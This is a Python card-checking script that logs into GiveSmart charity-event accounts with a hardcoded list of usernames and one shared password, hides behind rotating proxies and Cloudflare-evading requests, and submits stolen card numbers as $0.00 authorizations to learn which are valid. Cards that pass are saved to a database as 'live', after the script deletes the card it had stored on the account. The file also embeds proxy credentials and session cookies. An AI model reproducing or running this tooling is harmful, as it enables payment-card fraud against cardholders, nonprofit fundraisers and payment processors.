
import cloudscraper
from tool.infobill import infobill
import base64
import json
from time import sleep
from tool.infocc import info
from random import randint
import sys
billx = infobill()
import certifi
ccax = sys.argv[1]

from config.conexiondb import conect

port = str(randint(0,999))
portinit = ""

if len(port) == 2:
    portinit ='100'+port
    
elif len(port) == 3:
    portinit ='10'+port
elif len(port) == 1:
    portinit ='1000'+port


dataTest= ccax

ccinfo = info()
ccinfo2 = info()

ccinfo.info(dataTest,'xx xx')
ccinfo2.info(dataTest,'xx xxxx')

proxies = {
        'http': 'http://wlfmkp8tlwb7hbjxqnfvf6l:RNW78Fm5@fast.froxy.com:'+portinit, 
        'https': 'http://wlfmkp8tlwb7hbjxqnfvf6l:RNW78Fm5@fast.froxy.com:'+portinit
}

cs = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'android',
        'desktop': False
    },
    debug=False
    
    
    
)
def getStr(data,inicio,final):
    strx1 = data.split(inicio)
    strx2 = strx1[1].split(final)
    return strx2[0]
try:
    dataramd = [
                {
                    "url": "https://e.givesmart.com/events/Bo7/",
                    "users": [
                    "angioe0", "gubios93", "fer33", "khelo30", "ani39", 
                    "ansiw939", "jon39", "tom3i9", "juas8", "fair39"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/FyI/",
                    "users": [
                    "ricaow9", "marco39", "ffeo39os", "ruiz39", "poereo3", 
                    "strr93", "ange3o", "krizw9", "flores9844475210", "hardy3i"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/xci/",
                    "users": [
                    "suali3", "juaqi19", "alyns3", "maurnieto2", "toger", 
                    "juanwo3", "daniel39", "jualsi2", "ruiswo39", "juaqis9"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/flJ/i/",
                    "users": [
                    "efrais39", "rafael3", "samirw93", "eios93", "oresti39", 
                    "rami93", "ruis93k", "jarol93", "baradiw9", "ange39sk"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/BUN/",
                    "users": [
                    "fersna9", "samif", "gians9", "enrtis93", "angel39", 
                    "frloresd", "rommani3", "samir39", "llanos93", "roger39k"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/Amn/",
                    "users": [
                    "angel20ls", "joaqus9", "aureis93", "saul39kk", "frankcha", 
                    "davidow9", "edmor39", "frnachis93", "yadels", "mauricios93"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/Eic/",
                    "users": [
                    "giangi9", "moises93", "caosi93", "samirsj", "hamsr39", 
                    "rickysi", "lucasjie", "felixwssia", "ivanmro39", "brsun0"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/Cmd/",
                    "users": [
                    "tomas93k", "liamw9", "meivansi", "saidow0", "juansop", 
                    "teosic", "caros0", "ofrsioa", "hugso9", "dyalsi"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/DG4/",
                    "users": [
                    "enzo93", "Cars39", "fsixlq9", "noahsi", "ethasi3", 
                    "olive93", "sebasti92", "sidos9", "elotusc9", "thiagos92"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/tPT/",
                    "users": [
                    "samoop", "elios9", "aiden39", "lavis92", "kaendai", 
                    "ass9ss", "raquel9", "marksi29", "luighi92", "federisco9"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/vLq/",
                    "users": [
                    "telmasi93", "s90jd", "xiomas239", "chavei9", "monica2", 
                    "pdtrosi93", "farid0", "ferresd9", "nrosman92", "frnacs92"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/ElJ/i/",
                    "users": [
                    "filomeno29", "efrain29", "gianfranc29", "ronasil0", "sabdra9", 
                    "efrais9k", "pauls39", "francos91", "julian92s", "ramirw91"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/nmy/",
                    "users": [
                    "davidf9", "enriqe912", "samuwl19", "germans9", "rafael39", 
                    "carlso91i", "elias39k", "isac9wk", "liam92i", "efrioa9"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/DHv/",
                    "users": [
                    "carter39", "junisao2", "erikq9", "edriar02", "mateos91", 
                    "emily9", "juanso0", "fariso100", "samuels9", "nuet93k"
                    ]
                },
                {
                    "url": "https://e.givesmart.com/events/j8O/",
                    "users": [
                    "tomas92", "raggis9", "jimmt93", "crisuw9", "maurisu9", 
                    "rafael02", "chris93k", "salomw9q", "andy82i", "carlos9120"
                    ]
                }
            ]
    inirux = dataramd[randint(0,len(dataramd) -1 )]
    
    urlfomenr= inirux['url']
    userf = inirux['users'][randint(0,len(inirux['users'])-1)]

    ecewbto = getStr(urlfomenr,'givesmart.com/events/','/')
    headers = {
        
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'FETCH-CSRF-TOKEN': '1',
        'Origin': 'https://e.givesmart.com',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': urlfomenr+'?loginError=true&username='+userf,
        # 'Cookie': 'JSESSIONID=0A92A22799CF2DC19ED081B7EBE2F57D; __cf_bm=DcCAGndblRH0mw3RU4aD7A.Jz_CnlvFn.gYbGnCdJb0-1732045596-1.0.1.1-7_gdR.hYVoM4S7enbglQL8OQOUEvoLqKdPGWPjSiGGdL2gDuO3lv8K8j.S3AErtkagOkMjGE2Nk68bZu3pYuJg; _cfuvid=XGgSocvMZmMHbUhmBrHGMe_EBKXeZaQlr2HMRv3GTRk-1732045596018-0.0.1.1-604800000',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # 'Content-Length': '0',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    response = cs.post('https://e.givesmart.com/JavaScriptServlet',  headers=headers,proxies=proxies,verify=certifi.where())


    xyx= response.text
    headers = {
        
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest, XMLHttpRequest',
        'X-TOKEN':response.text,
        'Origin': 'https://e.givesmart.com',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': urlfomenr+'?loginError=true&username='+userf,
        # 'Cookie': 'JSESSIONID=0A92A22799CF2DC19ED081B7EBE2F57D; __cf_bm=DcCAGndblRH0mw3RU4aD7A.Jz_CnlvFn.gYbGnCdJb0-1732045596-1.0.1.1-7_gdR.hYVoM4S7enbglQL8OQOUEvoLqKdPGWPjSiGGdL2gDuO3lv8K8j.S3AErtkagOkMjGE2Nk68bZu3pYuJg; _cfuvid=XGgSocvMZmMHbUhmBrHGMe_EBKXeZaQlr2HMRv3GTRk-1732045596018-0.0.1.1-604800000; userInfo=ENWV-XFZE-VP1W-FCA4-M19I-I636-CXVA-326G; userInfo-alt=ENWV-XFZE-VP1W-FCA4-M19I-I636-CXVA-326G',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = {
        'username': userf,
        'password': 'Lokobox12@',
        'X-TOKEN': response.text,
    }

    response = cs.post(urlfomenr+'signIn/',  headers=headers, data=data)

    dxjson = response.json()['sessionId']



    headers = {
        
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': urlfomenr+'?loginError=true&username='+userf,
        # 'Cookie': 'JSESSIONID=4FB0FCB02FB97833504003945B65E5E5; __cf_bm=kEZ9ornH2eqlPM._xWIn3DHmOty6vYqIMTmX.LrJLOg-1732048098-1.0.1.1-ToHMYUWPVSdIRAO0PifkS7DEN3pXxP8XQ2vvn97MCxtDabKukWnw8e_iw0fDiy97cHN.nByx3m0TMGP7enzBbA; _cfuvid=l87WIx8r_cU4uqublnfCDmU3Inmgf9nQGSi.nktb94o-1732048098920-0.0.1.1-604800000; userInfo=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; userInfo-alt=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; auth=0c38f548-a2fd-408d-90ca-fecdaf7065e7; timezone=America/Bogota',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    response = cs.get(urlfomenr,  headers=headers)

    idsitepage = getStr(response.text,'name="redirect" value="/s/:','/e')
    


    headers = {
        
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/',
        # 'Cookie': 'JSESSIONID=3171AAAD9534D6D88065AB3D3B4B40C8; __cf_bm=kEZ9ornH2eqlPM._xWIn3DHmOty6vYqIMTmX.LrJLOg-1732048098-1.0.1.1-ToHMYUWPVSdIRAO0PifkS7DEN3pXxP8XQ2vvn97MCxtDabKukWnw8e_iw0fDiy97cHN.nByx3m0TMGP7enzBbA; _cfuvid=l87WIx8r_cU4uqublnfCDmU3Inmgf9nQGSi.nktb94o-1732048098920-0.0.1.1-604800000; userInfo=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; userInfo-alt=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; auth=0c38f548-a2fd-408d-90ca-fecdaf7065e7; timezone=America/Bogota',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }

    response = cs.get('https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/', headers=headers)



    headers = {
        
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/',
        # 'Cookie': 'JSESSIONID=712C9F28935FFCCA9A429EC53F923CA8; __cf_bm=kEZ9ornH2eqlPM._xWIn3DHmOty6vYqIMTmX.LrJLOg-1732048098-1.0.1.1-ToHMYUWPVSdIRAO0PifkS7DEN3pXxP8XQ2vvn97MCxtDabKukWnw8e_iw0fDiy97cHN.nByx3m0TMGP7enzBbA; _cfuvid=l87WIx8r_cU4uqublnfCDmU3Inmgf9nQGSi.nktb94o-1732048098920-0.0.1.1-604800000; userInfo=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; userInfo-alt=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; auth=0c38f548-a2fd-408d-90ca-fecdaf7065e7; timezone=America/Bogota',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    params = {
        'X-TOKEN': xyx,
    }

    response = cs.get(
        'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/addNewCard',
        params=params,

        headers=headers,
    )

    namefirts = getStr(response.text,'placeholder="first" value="','"')
    namelast = getStr(response.text,'placeholder="last" value="','"')
    
    merchant = getStr(response.text,'name="MERCHANT" value="','"')
    idcustom = getStr(response.text,'name="CUSTOM_ID" value="','"')
    usersas= getStr(response.text,'name="MERCHDATA_USERS" value="','"')

    headers = {
        
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'FETCH-CSRF-TOKEN': '1',
        'Origin': 'https://e.givesmart.com',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/addNewCard/?X-TOKEN='+xyx,
        # 'Cookie': 'JSESSIONID=A064FBDBB7C12090045B4FE6B40448D7; __cf_bm=kEZ9ornH2eqlPM._xWIn3DHmOty6vYqIMTmX.LrJLOg-1732048098-1.0.1.1-ToHMYUWPVSdIRAO0PifkS7DEN3pXxP8XQ2vvn97MCxtDabKukWnw8e_iw0fDiy97cHN.nByx3m0TMGP7enzBbA; _cfuvid=l87WIx8r_cU4uqublnfCDmU3Inmgf9nQGSi.nktb94o-1732048098920-0.0.1.1-604800000; userInfo=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; userInfo-alt=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; auth=0c38f548-a2fd-408d-90ca-fecdaf7065e7; timezone=America/Bogota',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # 'Content-Length': '0',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    response = cs.post('https://e.givesmart.com/JavaScriptServlet', headers=headers)


    datax = response.text

    xformat = datax.replace("X-TOKEN:","")
    headers = {
        
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://e.givesmart.com/',
        'Sec-Fetch-Dest': 'script',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Site': 'cross-site',
    }

    params = {
        'action': 'CE',
        'type': 'json',
        'data': ccinfo.ccnum,

    }

    response = cs.get('https://abc.prinpay.com/cardsecure/cs', params=params, headers=headers)


    dataxjs = getStr(response.text,'data" : "','"')



    headers = {
        
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://e.givesmart.com',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/addNewCard/?X-TOKEN=IKzZJGW9Bd3ihkKdAo5ZBUxDpBV85Y6UsLkYXEhs_U4AAAGTRiAlbA',
        # 'Cookie': 'JSESSIONID=A064FBDBB7C12090045B4FE6B40448D7; __cf_bm=kEZ9ornH2eqlPM._xWIn3DHmOty6vYqIMTmX.LrJLOg-1732048098-1.0.1.1-ToHMYUWPVSdIRAO0PifkS7DEN3pXxP8XQ2vvn97MCxtDabKukWnw8e_iw0fDiy97cHN.nByx3m0TMGP7enzBbA; _cfuvid=l87WIx8r_cU4uqublnfCDmU3Inmgf9nQGSi.nktb94o-1732048098920-0.0.1.1-604800000; userInfo=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; userInfo-alt=AQ2K-KKSR-YP8C-6V23-7PHP-NQE6-9H8T-OCUV; auth=0c38f548-a2fd-408d-90ca-fecdaf7065e7; timezone=America/Bogota',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }

    data = {
        'CC_NUM': '',
        'month': ccinfo2.expm,
        'year': ccinfo2.expy,
        'CC_EXPIRES': ccinfo.expm+ccinfo.expy,
        'CVCCVV2': ccinfo.cv2,
        'NAME1': namefirts,
        'NAME2': namelast,
        'COUNTRY': 'United States',
        'ADDR1': billx.address,
        'ADDR2': '',
        'CITY': billx.city,
        'STATE': billx.estado2,
        'ZIPCODE': billx.zipcode,
        'chkStoreCard': 'on',
        'storeCardVal': 'true',
        'isTicketing': '',
        'originLink': '',
        'payFees': 'false',
        'RESPONSEVERSION': '9999',
        'MISSING_URL': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/addNewCard/../missing',
        'APPROVED_URL': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/addNewCard/../approved',
        'DECLINED_URL': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/addNewCard/../declined',
        'MERCHANT': merchant,
        'TRANSACTION_TYPE': 'AUTH',
        'DOC_TYPE': 'WEB',
        'AMOUNT': '0.00',
        'TOTALWITHFEE': '0.00',
        'MODE': 'LIVE',
        'CUSTOM_ID': idcustom,
        'MERCHDATA_USERS': usersas,
        'PURCHASER_ID': '',
        'COMMENTS': '',
        'MERCHDATA_BALANCES': '',
        'CARDTOKEN': dataxjs,
        'PROCESSOR': 'CC',
        'TOKENIZER_URL': 'https://abc.prinpay.com/cardsecure/cs',
        'g-recaptcha-response': '',
        'systemAPIKey': '',
        'X-TOKEN': [
            xformat,
            xformat,
        ],
    }

    response = cs.post(
        'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/processcard/cc/',

        headers=headers,
        data=data,
    )


    if "CVV2 Declined" in response.text:
        print({"msg":1,"data":"declinado cvv"})
    elif "Expired card" in response.text:
        print({"msg":1,"data":"fecha expirada"})
    elif "Payment declined: Decline" in response.text:
        
        
        print({"msg":2,"data":"live por declinado"})  
        conect.getDb().savecore.insert_one({"datacc":dataTest})
    elif "Invalid account number" in response.text:
        print({"msg":1,"data":"invalid account number"})  
    elif "Do not honor" in response.text:
        print({"msg":1,"data":"not honor"})  
    elif "Do not try again" in response.text:
        print({"msg":1,"data":"dead 2"}) 
    elif 'Payment declined: Retry with 3DS' in response.text:
        print({"msg":7,"data":"3d retry revisar"})
    elif '>Remove</a>' in response.text:
        
        try:
            idacrfs = getStr(response.text,'href="./cardonfile/','/')
         
            headers = {

                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                # 'Accept-Encoding': 'gzip, deflate, br, zstd',
                'FETCH-CSRF-TOKEN': '1',
                'Origin': 'https://e.givesmart.com',
                'DNT': '1',
                'Sec-GPC': '1',
                'Connection': 'keep-alive',
                'Referer': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/cardonfile/'+idacrfs+'/',
                # 'Cookie': 'JSESSIONID=427A14E096E744410325B4F404E80500; __cf_bm=YyXKCE1Kojh7pWb.FgY1l6l2E6TjidXYKcMgFTDGtPA-1733258965-1.0.1.1-mrWE11x.XJ0eG_xPIqnRcjU5I_PSK8xv8NORYJq7VuDG0A3tsSq8TArS6U3m5PsvDJzWd5enMMszhF6JMy9Udw; _cfuvid=fiMgb.vSiPvdDmDbEhA6X2O7k8WHZ8iEytQBol0fW1w-1733258965379-0.0.1.1-604800000; userInfo=BD7O-O8I7-RH3D-5OIS-PYCC-EJ3L-2E3H-LPD4; userInfo-alt=BD7O-O8I7-RH3D-5OIS-PYCC-EJ3L-2E3H-LPD4; auth=0c38f548-a2fd-408d-90ca-fecdaf7065e7; timezone=America/Bogota',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                # 'Content-Length': '0',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            }

            response = cs.post('https://e.givesmart.com/JavaScriptServlet', headers=headers)
            
            datax = response.text

            xformat = datax.replace("X-TOKEN:","")
            

            headers = {
               
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                # 'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://e.givesmart.com',
                'DNT': '1',
                'Sec-GPC': '1',
                'Connection': 'keep-alive',
                'Referer': 'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/cardonfile/'+idacrfs+'/',
                # 'Cookie': 'JSESSIONID=427A14E096E744410325B4F404E80500; __cf_bm=YyXKCE1Kojh7pWb.FgY1l6l2E6TjidXYKcMgFTDGtPA-1733258965-1.0.1.1-mrWE11x.XJ0eG_xPIqnRcjU5I_PSK8xv8NORYJq7VuDG0A3tsSq8TArS6U3m5PsvDJzWd5enMMszhF6JMy9Udw; _cfuvid=fiMgb.vSiPvdDmDbEhA6X2O7k8WHZ8iEytQBol0fW1w-1733258965379-0.0.1.1-604800000; userInfo=BD7O-O8I7-RH3D-5OIS-PYCC-EJ3L-2E3H-LPD4; userInfo-alt=BD7O-O8I7-RH3D-5OIS-PYCC-EJ3L-2E3H-LPD4; auth=0c38f548-a2fd-408d-90ca-fecdaf7065e7; timezone=America/Bogota',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
                # Requests doesn't support trailers
                # 'TE': 'trailers',
            }

            data = {
                'X-TOKEN': xformat,
            }

            response = cs.post(
                'https://e.givesmart.com/s/:'+idsitepage+'/e/'+ecewbto+'/m/info/cardonfile/'+idacrfs+'/',
   
                headers=headers,
                data=data,
            )
        except:
            pass
        
        print({"msg":2,"data":"sucess"})
        conect.getDb().savecore.insert_one({"datacc":dataTest})
    else:
        datax = open("testgatexCoreuncheck.Html","w")

        datax.write(response.text)

        datax.close()

        print({"msg":3})
except Exception as e:
    print({"msg":4,'data':str(e)})


